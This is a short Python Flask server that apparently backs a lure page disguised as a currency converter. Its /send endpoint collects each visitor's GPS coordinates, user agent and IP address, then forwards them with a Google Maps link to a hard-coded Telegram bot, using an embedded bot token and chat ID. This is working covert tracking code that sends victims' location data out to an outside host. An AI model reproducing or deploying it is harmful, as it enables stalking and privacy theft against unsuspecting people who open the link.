from flask import Flask, request, jsonify, send_from_directory
import requests

app = Flask(__name__)

BOT_TOKEN = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0"
CHAT_ID = "7485197107"

@app.route("/")
def index():
    return send_from_directory('.', 'index.html')

@app.route("/send", methods=["POST"])
def send():
    data = request.get_json()
    latitude = data.get("latitude")
    longitude = data.get("longitude")
    user_agent = data.get("userAgent")
    ip_address = request.headers.get("X-Forwarded-For", request.remote_addr)

    message = f"📡 تم الدخول إلى رابط تحويل العملات:\n\n" \
              f"🌍 IP: {ip_address}\n📱 الجهاز: {user_agent}\n" \
              f"📍 الموقع: https://maps.google.com/?q={latitude},{longitude}"

    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
        "chat_id": CHAT_ID,
        "text": message
    })

    return jsonify({"status": "sent"}), 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
